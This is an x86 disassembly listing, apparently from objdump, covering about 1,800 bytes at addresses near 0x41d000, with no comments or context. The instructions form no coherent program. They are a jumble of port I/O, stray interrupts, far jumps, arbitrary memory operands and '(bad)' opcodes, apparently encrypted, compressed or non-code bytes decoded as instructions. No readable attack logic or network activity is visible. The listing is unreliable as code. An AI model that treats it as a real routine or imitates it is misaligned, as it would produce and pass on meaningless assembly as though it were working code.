  41d12d:	out    0x0,al
  41d12f:	pop    edi
  41d130:	outs   dx,BYTE PTR ds:[esi]
  41d131:	push   edi
  41d132:	inc    ecx
  41d133:	jmp    DWORD PTR [ebp-0x5e955f9b]
  41d139:	adc    eax,0x47787c84
  41d13e:	jge    0x41d0c0
  41d140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d141:	cmp    DWORD PTR [edx-0x1d5ce008],0x3afe80c7
  41d14b:	inc    ebx
  41d14c:	xchg   edx,eax
  41d14d:	adc    ecx,DWORD PTR [edx-0x535c52e7]
  41d153:	test   DWORD PTR [edi],eax
  41d155:	jno    0x41d119
  41d157:	pop    ecx
  41d158:	xlat   BYTE PTR ds:[ebx]
  41d159:	lods   eax,DWORD PTR ds:[esi]
  41d15a:	imul   esp,DWORD PTR [eax-0xa26fa46],0x52
  41d161:	jecxz  0x41d100
  41d163:	pusha  
  41d164:	imul   esi,DWORD PTR [edi+0x7e],0xee7afaf8
  41d16b:	pop    esp
  41d16c:	fstp   DWORD PTR [edx-0x49f2b78e]
  41d172:	jno    0x41d121
  41d174:	dec    esp
  41d175:	fsubr  QWORD PTR [esi]
  41d177:	test   al,0xfa
  41d179:	mov    ds:0x8c4d558a,eax
  41d17e:	sub    al,0xf8
  41d180:	add    al,0xa5
  41d182:	jle    0x41d1f2
  41d184:	adc    BYTE PTR [edx-0x19],dh
  41d187:	faddp  st(4),st
  41d189:	sbb    edx,esp
  41d18b:	sbb    al,0x8d
  41d18d:	sbb    eax,0x7a652c9c
  41d192:	cmp    edx,DWORD PTR [esi+0x48]
  41d195:	jns    0x41d119
  41d197:	in     eax,dx
  41d198:	pop    edi
  41d199:	and    esp,DWORD PTR [ebp-0x3f]
  41d19c:	lds    edi,FWORD PTR [ecx+0x48]
  41d19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1a0:	jno    0x41d127
  41d1a2:	xor    bh,BYTE PTR [ebx+0x2ff8d0a1]
  41d1a8:	imul   DWORD PTR [esi+0x63791cbe]
  41d1ae:	cmove  esp,DWORD PTR [ecx-0x5a184810]
  41d1b5:	pop    ss
  41d1b6:	int    0xd
  41d1b8:	pop    ss
  41d1b9:	add    ecx,ebp
  41d1bb:	dec    esp
  41d1bc:	addr16 std 
  41d1be:	xchg   esi,eax
  41d1bf:	shl    ecx,0x8
  41d1c2:	test   DWORD PTR [eax+0x5be6a4e0],0x56e0800e
  41d1cc:	pop    edi
  41d1cd:	retf   0xfb94
  41d1d0:	retf   
  41d1d1:	mov    ebx,esi
  41d1d3:	rol    DWORD PTR [esi+0x4e],0xa9
  41d1d7:	mov    dh,0x58
  41d1d9:	xchg   ebp,ebp
  41d1db:	addr16 mov ecx,0xcb356083
  41d1e1:	cdq    
  41d1e2:	and    DWORD PTR [esi],esp
  41d1e4:	dec    eax
  41d1e5:	add    DWORD PTR [ebx],esp
  41d1e7:	test   DWORD PTR [eax+0x6b2a8dd],edi
  41d1ed:	xchg   ebp,eax
  41d1ee:	or     bh,BYTE PTR [ebx]
  41d1f0:	pop    ds
  41d1f1:	mov    WORD PTR [eax-0x1cead722],gs
  41d1f7:	sub    al,0xca
  41d1f9:	and    BYTE PTR [edi-0x51e01957],dh
  41d1ff:	stos   BYTE PTR es:[edi],al
  41d200:	push   ss
  41d201:	add    eax,0x2f71774f
  41d206:	sub    al,0x9c
  41d208:	bound  esi,QWORD PTR [edi]
  41d20a:	test   BYTE PTR [edi+eiz*8-0x4c],0x29
  41d20f:	xchg   BYTE PTR [eax+0x76],bl
  41d212:	add    DWORD PTR [ecx+0x51],0x64
  41d216:	pop    ebp
  41d217:	push   esp
  41d218:	popf   
  41d219:	clc    
  41d21a:	repz int 0xb3
  41d21d:	int    0x7
  41d21f:	mov    ds:0x9e8b48,eax
  41d224:	jae    0x41d20b
  41d226:	dec    esi
  41d227:	jnp    0x41d204
  41d229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d22a:	int3   
  41d22b:	xchg   ebp,eax
  41d22c:	pop    esi
  41d22d:	(bad)  
  41d22e:	mov    dh,0xcd
  41d230:	test   al,0xdc
  41d232:	jnp    0x41d241
  41d234:	push   0x1c8ff1d5
  41d239:	inc    ecx
  41d23a:	and    bh,BYTE PTR [edi+0x9b87262]
  41d240:	jmp    0x2c84:0x2464b91f
  41d247:	adc    DWORD PTR ds:0x1fb53bdd,eax
  41d24d:	leave  
  41d24e:	jge    0x41d26b
  41d250:	out    0x77,al
  41d252:	stos   BYTE PTR es:[edi],al
  41d253:	rcr    BYTE PTR [edx-0x4ef6bd69],cl
  41d259:	inc    ebp
  41d25a:	jl     0x41d206
  41d25c:	fwait
  41d25d:	inc    edi
  41d25e:	(bad)  
  41d25f:	mov    ah,0xe4
  41d261:	adc    BYTE PTR [ebx-0x8],cl
  41d264:	stc    
  41d265:	cmp    cl,BYTE PTR [edi]
  41d267:	xor    DWORD PTR [ecx+0x63],ecx
  41d26a:	and    dl,BYTE PTR [ebp+0x72]
  41d26d:	mov    bl,0xcb
  41d26f:	pop    ecx
  41d270:	sbb    al,0x7f
  41d272:	shl    BYTE PTR [ebx+0x61],0x4c
  41d276:	fcmovne st,st(7)
  41d278:	push   0x56c380a7
  41d27d:	hlt    
  41d27e:	jl     0x41d203
  41d280:	test   al,0x18
  41d283:	shl    BYTE PTR [ebp+0x4],0x34
  41d287:	mov    bl,0x75
  41d289:	xor    eax,0x11bce8cc
  41d28e:	jmp    0x949d3b91
  41d293:	push   es
  41d294:	call   0x1b307d72
  41d299:	push   ds
  41d29a:	in     eax,dx
  41d29b:	test   DWORD PTR [eax+0xd],edx
  41d29e:	push   ebp
  41d29f:	pushf  
  41d2a0:	cmp    ecx,DWORD PTR [edx]
  41d2a2:	dec    ecx
  41d2a3:	push   0xa938cb09
  41d2a8:	and    al,0xa8
  41d2ab:	bound  edx,QWORD PTR [ecx+eax*8+0x5c]
  41d2af:	cmp    BYTE PTR [edx+0xd70a3f8],0x2f
  41d2b6:	and    DWORD PTR cs:[ebp+0x1a4df4cd],edi
  41d2bd:	jle    0x41d2d2
  41d2bf:	shr    BYTE PTR [ebx],0xf2
  41d2c2:	sbb    esi,DWORD PTR [ebp-0x46]
  41d2c5:	in     al,dx
  41d2c6:	pop    ds
  41d2c7:	scas   eax,DWORD PTR es:[edi]
  41d2c8:	test   BYTE PTR [eax+0x46],al
  41d2cb:	neg    edi
  41d2cd:	out    0x41,eax
  41d2cf:	inc    esp
  41d2d0:	push   ss
  41d2d1:	mov    bh,0xb8
  41d2d3:	xor    eax,0xe8bbc6d4
  41d2d8:	aam    0x52
  41d2da:	pop    ds
  41d2db:	sub    BYTE PTR [ecx],ch
  41d2dd:	ret    0xe953
  41d2e0:	das    
  41d2e1:	test   eax,0x43bd40f0
  41d2e6:	aas    
  41d2e7:	jbe    0x41d367
  41d2e9:	mov    DWORD PTR [edi],eax
  41d2eb:	ins    BYTE PTR es:[edi],dx
  41d2ec:	scas   al,BYTE PTR es:[edi]
  41d2ed:	imul   esi,DWORD PTR [edi+0x191b4220],0xc8874db5
  41d2f7:	push   0x3d
  41d2f9:	jbe    0x41d377
  41d2fb:	cbw    
  41d2fd:	adc    dh,ch
  41d2ff:	sbb    BYTE PTR [eax-0x6],bh
  41d302:	fwait
  41d303:	retf   0xd527
  41d306:	adc    BYTE PTR [ecx+0x5c],bh
  41d309:	outs   dx,DWORD PTR ds:[esi]
  41d30a:	out    0x0,al
  41d30c:	fisub  DWORD PTR ds:0x6bc37dd9
  41d312:	jnp    0x41d2bf
  41d314:	mov    dl,0xfa
  41d316:	pop    edi
  41d317:	cmp    BYTE PTR [edi-0x73aa8b6f],cl
  41d31d:	sti    
  41d31e:	pop    esi
  41d31f:	jae    0x41d2cb
  41d321:	cmp    al,0x64
  41d323:	mov    ebp,0x5b8ad754
  41d328:	push   cs
  41d329:	xor    eax,0x44766feb
  41d32e:	and    DWORD PTR [ebx-0x34],esp
  41d331:	xchg   esp,eax
  41d332:	fptan  
  41d334:	push   cs
  41d335:	(bad)  
  41d336:	stos   BYTE PTR es:[edi],al
  41d337:	cmp    ebp,DWORD PTR [edi]
  41d339:	jge    0x41d3ad
  41d33b:	stc    
  41d33c:	mov    DWORD PTR [ecx-0x2c0978ce],ecx
  41d342:	enter  0x7aaf,0xfc
  41d346:	xor    esi,DWORD PTR [ecx+ebx*8-0x34]
  41d34a:	popa   
  41d34b:	sbb    ecx,ecx
  41d34d:	dec    ecx
  41d34e:	js     0x41d39b
  41d350:	sbb    eax,0xfc760ec6
  41d355:	jge    0x41d308
  41d357:	lds    ecx,FWORD PTR [esi+0x40]
  41d35a:	inc    eax
  41d35b:	sub    esp,esi
  41d35d:	add    edi,edx
  41d35f:	lahf   
  41d360:	mov    esp,0xbe12fbf9
  41d365:	mov    edx,0x65cc71cf
  41d36a:	jecxz  0x41d38c
  41d36c:	jae    0x41d3af
  41d36e:	sahf   
  41d36f:	cwde   
  41d370:	push   eax
  41d371:	mul    DWORD PTR [edx-0x32a72a41]
  41d377:	outs   dx,BYTE PTR ds:[esi]
  41d378:	lods   eax,DWORD PTR ds:[esi]
  41d379:	les    esi,FWORD PTR [edx]
  41d37b:	daa    
  41d37c:	es jmp 0x41d36e
  41d37f:	mov    dh,0xc3
  41d381:	push   0x1e987449
  41d386:	mov    ch,0xaa
  41d388:	lods   eax,DWORD PTR ds:[esi]
  41d389:	(bad)  
  41d38a:	sbb    edx,DWORD PTR [ecx]
  41d38c:	push   ecx
  41d38d:	fcomp  QWORD PTR [eax-0x50]
  41d390:	pop    ebp
  41d391:	repnz pop ss
  41d393:	dec    edi
  41d394:	xor    bl,BYTE PTR [eax+0xdf2387]
  41d39a:	nop
  41d39b:	sub    ch,bl
  41d39d:	popf   
  41d39e:	test   eax,0x46475468
  41d3a3:	jne    0x41d389
  41d3a5:	xor    dl,dh
  41d3a7:	push   esi
  41d3a8:	pop    es
  41d3a9:	shl    esp,cl
  41d3ab:	xchg   DWORD PTR [ecx+0xc2b6f5d],ecx
  41d3b1:	shl    BYTE PTR [ecx],0x14
  41d3b4:	aad    0x97
  41d3b6:	outs   dx,BYTE PTR ds:[esi]
  41d3b7:	cmp    BYTE PTR [edx],bh
  41d3b9:	pop    ebx
  41d3ba:	mov    dl,0x99
  41d3bc:	inc    eax
  41d3bd:	sti    
  41d3be:	in     al,dx
  41d3bf:	push   esi
  41d3c0:	sub    eax,0xf551e716
  41d3c5:	adc    DWORD PTR [esi-0x45a2005b],ebp
  41d3cb:	inc    ebx
  41d3cc:	lods   al,BYTE PTR ds:[esi]
  41d3cd:	lods   al,BYTE PTR gs:[esi]
  41d3cf:	pop    eax
  41d3d0:	adc    BYTE PTR [edi-0x1b642bc3],dl
  41d3d6:	dec    eax
  41d3d7:	call   0x11c5fe3f
  41d3dc:	pop    edx
  41d3dd:	mov    esi,0x954aba71
  41d3e2:	and    BYTE PTR [ebx+0x2d717b98],ah
  41d3e8:	xor    BYTE PTR [eax-0x2a],cl
  41d3eb:	nop
  41d3ec:	rcl    DWORD PTR [eax],cl
  41d3ee:	jp     0x41d397
  41d3f0:	stos   DWORD PTR es:[edi],eax
  41d3f1:	test   edx,0x5193cedf
  41d3f7:	xor    edi,DWORD PTR [ebx-0x63]
  41d3fa:	and    BYTE PTR [ebp+0x41230304],dh
  41d400:	call   0x2dfce447
  41d405:	in     al,0xfe
  41d407:	push   edx
  41d408:	shl    BYTE PTR [ebx+ebx*8+0x25],0xe3
  41d40d:	mov    ch,0xfd
  41d40f:	rcr    DWORD PTR [ebx],cl
  41d411:	sbb    esp,edi
  41d413:	jge    0x41d428
  41d415:	mov    ah,0x8a
  41d417:	ret    0x5414
  41d41a:	js     0x41d486
  41d41c:	sbb    eax,0xcbd27a55
  41d421:	sbb    BYTE PTR [edi-0x50],al
  41d424:	jmp    0x4505ae1a
  41d429:	xor    DWORD PTR [edx],ecx
  41d42b:	push   cs
  41d42c:	loop   0x41d49b
  41d42e:	dec    ebx
  41d42f:	mov    bh,0x77
  41d431:	outs   dx,DWORD PTR ds:[esi]
  41d432:	cmc    
  41d433:	bound  edi,QWORD PTR [eax]
  41d435:	fwait
  41d436:	cdq    
  41d437:	inc    ecx
  41d438:	and    BYTE PTR [ebp+ecx*8+0x63],bh
  41d43c:	pop    ebp
  41d43d:	std    
  41d43e:	dec    edx
  41d43f:	mov    al,0xa8
  41d441:	pmuludq mm7,QWORD PTR [edx-0x7f]
  41d445:	push   edi
  41d446:	sti    
  41d447:	mov    WORD PTR [ebx],fs
  41d449:	push   ebx
  41d44a:	in     al,0x6e
  41d44c:	popa   
  41d44d:	or     edi,ebx
  41d44f:	mov    ah,0xfd
  41d451:	mov    ebx,0x58d23004
  41d456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d457:	xchg   BYTE PTR [ecx-0x4e4ce3a4],bh
  41d45d:	dec    esp
  41d45e:	lods   al,BYTE PTR ds:[esi]
  41d45f:	sub    esp,DWORD PTR [eax-0x1a224565]
  41d465:	out    dx,eax
  41d466:	(bad)  
  41d467:	mov    bh,0xc5
  41d469:	stc    
  41d46a:	fdiv   st,st(3)
  41d46c:	add    eax,0xcccff75b
  41d471:	mov    eax,0xe653a436
  41d476:	dec    esi
  41d477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d478:	iret   
  41d479:	int    0x83
  41d47b:	sbb    al,0xf3
  41d47d:	sbb    ebx,eax
  41d47f:	arpl   WORD PTR [ebx],si
  41d481:	mov    ds:0x9eeb836e,al
  41d486:	push   esp
  41d487:	and    eax,0xdf0eed0
  41d48c:	sbb    eax,0x2cdc32e5
  41d491:	dec    eax
  41d492:	xchg   DWORD PTR [ecx+ebp*8],ecx
  41d495:	dec    esi
  41d496:	push   esi
  41d497:	nop
  41d498:	xchg   esp,eax
  41d499:	outs   dx,DWORD PTR ds:[esi]
  41d49a:	inc    edx
  41d49b:	fst    DWORD PTR [esi]
  41d49d:	jns    0x41d4e0
  41d49f:	add    BYTE PTR ds:0xa52a8933,bh
  41d4a5:	inc    edi
  41d4a6:	dec    eax
  41d4a7:	jnp    0x41d447
  41d4a9:	push   esi
  41d4aa:	dec    ebp
  41d4ab:	adc    DWORD PTR [esi+0xea54c98],ecx
  41d4b1:	mov    esp,0x70600da2
  41d4b6:	push   ss
  41d4b7:	inc    edi
  41d4b8:	mov    ebp,eax
  41d4ba:	fwait
  41d4bb:	test   eax,0x8c5c0b6e
  41d4c0:	push   0x81d50b18
  41d4c5:	jbe    0x41d53a
  41d4c7:	mov    eax,ds:0x83561e89
  41d4cc:	adc    DWORD PTR [esi],ecx
  41d4ce:	sahf   
  41d4cf:	pop    es
  41d4d0:	push   ecx
  41d4d1:	leave  
  41d4d2:	mov    bh,0xb9
  41d4d4:	in     al,0x8b
  41d4d6:	xchg   esp,eax
  41d4d7:	int3   
  41d4d8:	clc    
  41d4d9:	mov    ah,0xb9
  41d4db:	pop    esi
  41d4dc:	jmp    0x41d45e
  41d4de:	pusha  
  41d4df:	outs   dx,BYTE PTR ds:[esi]
  41d4e0:	out    0xa8,al
  41d4e2:	pushf  
  41d4e3:	cmp    esp,DWORD PTR ds:0x9d08b4f9
  41d4e9:	int3   
  41d4ea:	inc    esp
  41d4eb:	adc    ch,BYTE PTR [ecx+0x72b8ae75]
  41d4f1:	adc    edi,eax
  41d4f3:	sub    al,0xfb
  41d4f5:	sahf   
  41d4f6:	stos   BYTE PTR es:[edi],al
  41d4f7:	into   
  41d4f8:	cmp    BYTE PTR [ecx+0x59],ch
  41d4fb:	mov    ch,0xa1
  41d4fd:	jo     0x41d4de
  41d4ff:	cwde   
  41d500:	ds jmp 0xad8b772e
  41d506:	add    al,0xc1
  41d508:	and    eax,0xd45db0c7
  41d50d:	inc    edx
  41d50e:	and    eax,0xeb11b050
  41d513:	sub    al,ch
  41d515:	fs jmp 0x7036:0xff6921f3
  41d51d:	pop    ebx
  41d51e:	and    BYTE PTR [edx+eiz*2-0x5f],0x32
  41d523:	or     ebx,DWORD PTR [ebx]
  41d525:	dec    esi
  41d526:	test   BYTE PTR [ecx+edx*1],0x14
  41d52a:	inc    ebx
  41d52b:	xlat   BYTE PTR ds:[ebx]
  41d52c:	repz push ss
  41d52e:	test   BYTE PTR [ecx],dh
  41d530:	dec    esi
  41d531:	inc    ebp
  41d532:	inc    esi
  41d533:	js     0x41d568
  41d535:	add    DWORD PTR [ebx-0x7b],0xffffffcd
  41d539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d53a:	pushf  
  41d53b:	mov    ds:0xd86a7ef1,eax
  41d540:	jno    0x41d570
  41d542:	iret   
  41d543:	xor    DWORD PTR [ebx],ecx
  41d545:	jb     0x41d537
  41d547:	inc    ebp
  41d548:	xor    eax,0x1ac76084
  41d54d:	stos   BYTE PTR es:[edi],al
  41d54e:	or     BYTE PTR [ebp+0x52a22d9b],al
  41d554:	sbb    BYTE PTR [edi*4-0x5446ce55],bh
  41d55b:	inc    esp
  41d55c:	addr16 fcmovnb st,st(1)
  41d55f:	add    edx,0x7
  41d562:	cmp    ebx,ebp
  41d564:	sub    ch,0xc0
  41d567:	mov    al,ds:0x4ef58085
  41d56c:	sub    DWORD PTR [ecx+ecx*8-0x2f],0x39
  41d571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d572:	shr    DWORD PTR [eax-0xef0f23],1
  41d578:	pop    ss
  41d579:	(bad)  
  41d57a:	xchg   edx,eax
  41d57b:	rol    DWORD PTR [edx-0x14b85444],cl
  41d581:	sbb    al,0x27
  41d583:	mov    esp,0x8d6ba16
  41d588:	push   eax
  41d589:	mov    cl,0xad
  41d58b:	popa   
  41d58c:	cs popf 
  41d58e:	xchg   edi,eax
  41d58f:	bound  eax,QWORD PTR [eax]
  41d591:	inc    esp
  41d592:	mov    al,ds:0x810ace2f
  41d597:	cmp    edi,edx
  41d599:	arpl   WORD PTR [esi-0x2d],bx
  41d59c:	push   ebx
  41d59d:	mov    al,0xc3
  41d59f:	imul   esi,DWORD PTR [eax],0x4e
  41d5a2:	js     0x41d5fd
  41d5a4:	jl     0x41d572
  41d5a6:	repz mov ebx,0x29682431
  41d5ac:	pop    ebp
  41d5ad:	jne    0x41d577
  41d5af:	mov    BYTE PTR [edi],ah
  41d5b1:	inc    esp
  41d5b2:	and    dl,BYTE PTR [edx-0x30fadf16]
  41d5b8:	push   ecx
  41d5b9:	loopne 0x41d552
  41d5bb:	xchg   ecx,eax
  41d5bc:	jo     0x41d55e
  41d5be:	and    eax,0x257f11a0
  41d5c3:	jg     0x41d55d
  41d5c5:	lods   al,BYTE PTR ds:[esi]
  41d5c6:	push   edi
  41d5c7:	lods   eax,DWORD PTR ds:[esi]
  41d5c8:	jnp    0x41d5fb
  41d5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5cb:	sbb    al,0xc6
  41d5cd:	(bad)  
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	cmp    al,0x65
  41d5d1:	push   es
  41d5d2:	aas    
  41d5d3:	sbb    al,0xf4
  41d5d5:	or     edx,DWORD PTR [edi]
  41d5d7:	mov    ch,0x41
  41d5d9:	or     ah,BYTE PTR [esi]
  41d5db:	xchg   esp,eax
  41d5dc:	gs jge 0x41d5e6
  41d5df:	pop    eax
  41d5e0:	pop    es
  41d5e1:	xor    ebp,DWORD PTR [edx-0x6c]
  41d5e4:	xor    DWORD PTR ds:0x86c0fcb5,ebx
  41d5ea:	add    BYTE PTR [edx-0x4d],bl
  41d5ed:	stos   DWORD PTR es:[edi],eax
  41d5ee:	mov    edx,0x6c6662a3
  41d5f3:	xchg   esp,eax
  41d5f4:	jae    0x41d5ea
  41d5f6:	call   0xeced2264
  41d5fb:	push   esi
  41d5fc:	es mov ch,0xa9
  41d5ff:	mov    al,bh
  41d601:	nop
  41d602:	xchg   ebp,eax
  41d603:	or     eax,0xb530aa3f
  41d608:	or     dh,BYTE PTR [esi+0x62]
  41d60b:	pop    eax
  41d60c:	mov    ebp,0x6dedf119
  41d611:	pop    ss
  41d612:	pop    ds
  41d613:	test   BYTE PTR [edi],bh
  41d615:	dec    edx
  41d616:	or     ecx,DWORD PTR [edx]
  41d618:	xor    DWORD PTR [edi-0xc],0x777e32e9
  41d61f:	jne    0x41d621
  41d621:	mov    bh,0xbb
  41d623:	xor    al,0x5b
  41d625:	mov    esi,DWORD PTR [eax]
  41d627:	rcl    BYTE PTR [ebx+ecx*8+0x3b],0xc0
  41d62c:	aad    0x60
  41d62e:	ds ins DWORD PTR es:[edi],dx
  41d630:	shr    DWORD PTR [edx+0x6189e28a],1
  41d636:	aam    0x8f
  41d638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d639:	lea    eax,[ebp-0x5f128bec]
  41d63f:	lea    eax,[ebx-0x2c]
  41d642:	loope  0x41d62c
  41d644:	loopne 0x41d671
  41d646:	shr    ch,1
  41d648:	stc    
  41d649:	out    0x2d,eax
  41d64b:	ficomp WORD PTR [eax-0x15211f40]
  41d651:	mov    ebp,0x5d424c95
  41d656:	out    dx,eax
  41d657:	adc    al,0x31
  41d659:	sub    eax,0x14442f14
  41d65e:	dec    edx
  41d65f:	push   edi
  41d660:	div    DWORD PTR [ebx]
  41d662:	pop    es
  41d663:	retf   
  41d664:	push   ebp
  41d665:	xchg   edx,eax
  41d666:	jp     0x41d62a
  41d668:	int    0x93
  41d66a:	jle    0x41d62e
  41d66c:	imul   edx,DWORD PTR [ebx+0xe174dd4],0x22
  41d673:	and    edi,DWORD PTR [eax+ecx*2-0x1d1982ac]
  41d67a:	jns    0x41d6a8
  41d67c:	sub    DWORD PTR [ebx],0x15543556
  41d682:	pop    esp
  41d683:	sub    DWORD PTR [edx],eax
  41d685:	mov    al,0x24
  41d687:	clc    
  41d688:	pop    es
  41d689:	mov    esp,0xced540d9
  41d68e:	inc    esi
  41d68f:	fnstcw WORD PTR [ecx+0x15]
  41d692:	push   0x54
  41d694:	xchg   ecx,eax
  41d695:	mov    ebp,0xdc4e9367
  41d69a:	fld    QWORD PTR [edi+0x19]
  41d69d:	xchg   edi,eax
  41d69e:	(bad)  
  41d6a0:	cdq    
  41d6a1:	sbb    al,0x8a
  41d6a3:	mov    DWORD PTR [ecx+0x5c],eax
  41d6a6:	sbb    edx,DWORD PTR [ecx+0x1a]
  41d6a9:	dec    edi
  41d6aa:	leave  
  41d6ab:	lds    ecx,FWORD PTR [ebp-0xbc02c32]
  41d6b1:	sub    al,dh
  41d6b3:	mov    WORD PTR [ebp-0x79],es
  41d6b6:	pop    edx
  41d6b7:	inc    edi
  41d6b8:	sbb    ecx,edx
  41d6ba:	or     al,0xdf
  41d6bc:	stos   DWORD PTR es:[edi],eax
  41d6bd:	xchg   ebx,eax
  41d6be:	adc    DWORD PTR [edi],edi
  41d6c0:	scas   eax,DWORD PTR es:[edi]
  41d6c1:	jns    0x41d6ad
  41d6c3:	retf   0xb493
  41d6c6:	push   es
  41d6c7:	std    
  41d6c8:	pop    ebx
  41d6c9:	scas   eax,DWORD PTR es:[edi]
  41d6ca:	jg     0x41d650
  41d6cc:	push   ebx
  41d6cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ce:	mov    edx,0x7c3a619a
  41d6d3:	outs   dx,DWORD PTR ds:[esi]
  41d6d4:	in     eax,0xdd
  41d6d6:	mov    ds:0x58ac76f4,eax
  41d6db:	cmp    edi,eax
  41d6dd:	shl    BYTE PTR [esp+edx*8],cl
  41d6e0:	push   ds
  41d6e1:	dec    eax
  41d6e2:	push   cs
  41d6e3:	test   DWORD PTR [ecx-0x3b],edi
  41d6e6:	ss nop
  41d6e8:	pop    es
  41d6e9:	pop    esi
  41d6ea:	or     eax,0xfc2687f
  41d6ef:	sbb    DWORD PTR ds:0x4dafbba9,ecx
  41d6f5:	fist   WORD PTR [esi+0x7a]
  41d6f8:	or     esi,DWORD PTR gs:[esi]
  41d6fb:	sub    eax,0xd6650419
  41d700:	rcr    DWORD PTR [edx+0x2c],0x27
  41d704:	div    DWORD PTR [ebp-0x4b]
  41d707:	(bad)  
  41d709:	jmp    0x41d6a3
  41d70b:	xor    DWORD PTR [eax+0x4b4ac92c],0xdebd5178
  41d715:	inc    edx
  41d716:	xor    DWORD PTR [eax],ebp
  41d718:	mov    edx,0x4619631d
  41d71d:	dec    ebp
  41d71e:	or     al,0x31
  41d720:	sub    esi,DWORD PTR [edi+0x3b28bcfb]
  41d726:	add    DWORD PTR [ebx+0x552074e4],esp
  41d72c:	imul   eax,DWORD PTR [ebp-0x56853a9f],0xc
  41d733:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d735:	nop    DWORD PTR ds:0x6bca3b90
  41d73c:	(bad)  [ecx-0x13ba75f3]
  41d742:	and    BYTE PTR [ebp-0x56],ch
  41d745:	jmp    0x41d73e
  41d747:	sbb    esp,DWORD PTR [edx+0x3e]
  41d74a:	test   BYTE PTR [ebx+0x55],al
  41d74d:	loope  0x41d6f0
  41d74f:	adc    ah,bl
  41d751:	lods   eax,DWORD PTR ds:[esi]
  41d752:	mov    ah,BYTE PTR [esi-0x7f]
  41d755:	or     ecx,0x3a
  41d758:	xor    ah,BYTE PTR ds:0x3a6e5f14
  41d75e:	push   ds
  41d75f:	jnp    0x41d6e9
  41d761:	loop   0x41d789
  41d763:	outs   dx,DWORD PTR ds:[esi]
  41d765:	cdq    
  41d766:	mov    dl,0xc0
  41d768:	popa   
  41d769:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41d76b:	sti    
  41d76c:	in     al,dx
  41d76d:	lock bound esi,QWORD PTR ds:0x5445d1c5
  41d774:	je     0x41d75c
  41d776:	in     al,0x15
  41d778:	in     al,0xe6
  41d77a:	inc    esp
  41d77b:	cmc    
  41d77c:	pop    es
  41d77d:	mov    eax,ds:0x86c6fc40
  41d783:	in     eax,dx
  41d784:	repz sbb esi,DWORD PTR [ebp+0x41]
  41d788:	jmp    0x41d7d8
  41d78a:	scas   al,BYTE PTR es:[edi]
  41d78b:	loop   0x41d7d2
  41d78d:	mov    WORD PTR [ebx-0x48],cs
  41d790:	push   ebp
  41d791:	mov    al,0x91
  41d793:	in     al,0x56
  41d795:	inc    esi
  41d796:	cwde   
  41d797:	jae    0x41d7d5
  41d799:	jp     0x41d749
  41d79b:	out    0xd0,al
  41d79d:	mov    ebx,0xe1f833e6
  41d7a2:	aad    0x3c
  41d7a4:	enter  0x90f0,0xce
  41d7a8:	ins    BYTE PTR es:[edi],dx
  41d7a9:	mov    dh,0xd3
  41d7ab:	call   DWORD PTR [eax]
  41d7ad:	not    DWORD PTR [edx+0x34]
  41d7b0:	mov    al,ds:0x1497ea6e
  41d7b5:	loope  0x41d73c
  41d7b7:	adc    DWORD PTR [edx],ecx
  41d7b9:	out    0x56,al
  41d7bb:	push   eax
  41d7bc:	add    al,BYTE PTR [esi-0x4d]
  41d7bf:	sbb    al,0xea
  41d7c2:	jne    0x41d7f9
  41d7c4:	mov    bh,0xd9
  41d7c6:	pushf  
  41d7c7:	in     al,0xb5
  41d7c9:	retf   0xe156
  41d7cc:	rol    dl,1
  41d7ce:	jg     0x41d76e
  41d7d0:	(bad)  
  41d7d1:	rcr    DWORD PTR gs:[esi],0x6c
  41d7d5:	inc    esp
  41d7d6:	loop   0x41d759
  41d7d8:	test   BYTE PTR [edx-0x33],dh
  41d7db:	and    eax,0x188aa692
  41d7e0:	dec    eax
  41d7e1:	mov    dl,0x51
  41d7e3:	xchg   ebx,eax
  41d7e4:	adc    al,0xba
  41d7e6:	pop    eax
  41d7e7:	retf   0x710
  41d7ea:	fmul   DWORD PTR [esi]
  41d7ec:	out    dx,al
  41d7ed:	cmp    bh,bh
  41d7ef:	lods   eax,DWORD PTR ds:[esi]
  41d7f0:	js     0x41d77d
  41d7f2:	pop    eax
  41d7f3:	mov    DWORD PTR [eax-0x2e],edi
  41d7f6:	cld    
  41d7f7:	and    ah,dh
  41d7f9:	or     cl,cl
  41d7fb:	mov    al,0xa3
  41d7fd:	xchg   esp,eax
  41d7fe:	lods   al,BYTE PTR ds:[esi]
  41d7ff:	stos   DWORD PTR es:[edi],eax
  41d800:	scas   al,BYTE PTR es:[edi]
  41d801:	rcl    edx,1
  41d803:	inc    ecx
  41d804:	data16 mov ch,0x92
  41d807:	sar    BYTE PTR [edi-0x55bfc6ba],0xdd
  41d80e:	loope  0x41d82e
  41d810:	pop    ebx
  41d811:	shl    BYTE PTR [ebp-0x73],0x9
  41d815:	mov    bh,0xa9
  41d817:	push   eax
  41d818:	leave  
  41d819:	mov    DWORD PTR [eax+0x6ee74a8b],ebp
  41d81f:	dec    ecx
  41d820:	xor    ecx,DWORD PTR [ebx-0x1f]
  41d823:	stc    
  41d824:	mov    esi,0xcda5df47
  41d829:	dec    ebp
  41d82a:	cmp    eax,0x56464a9f
  41d82f:	lock and eax,0xbfbe593d
  41d835:	push   ss
  41d836:	mov    edi,0xe912de83
  41d83b:	out    0x70,al
  41d83d:	inc    eax
  41d83e:	scas   al,BYTE PTR es:[edi]
  41d83f:	mov    ah,0x9f
  41d841:	les    esi,FWORD PTR [edi-0x17]
  41d844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d845:	retf   0xf788
  41d848:	inc    ecx
  41d849:	mov    edi,0x5fb8fb4c
  41d84e:	push   esi
  41d850:	scas   al,BYTE PTR es:[edi]
  41d851:	or     al,0xaf
  41d853:	lods   eax,DWORD PTR ds:[esi]
  41d854:	fmul   st,st(6)
  41d856:	popf   
  41d857:	mov    ebp,0xfb306115
  41d85c:	add    eax,ebp
  41d85e:	sub    eax,0x52a5d777
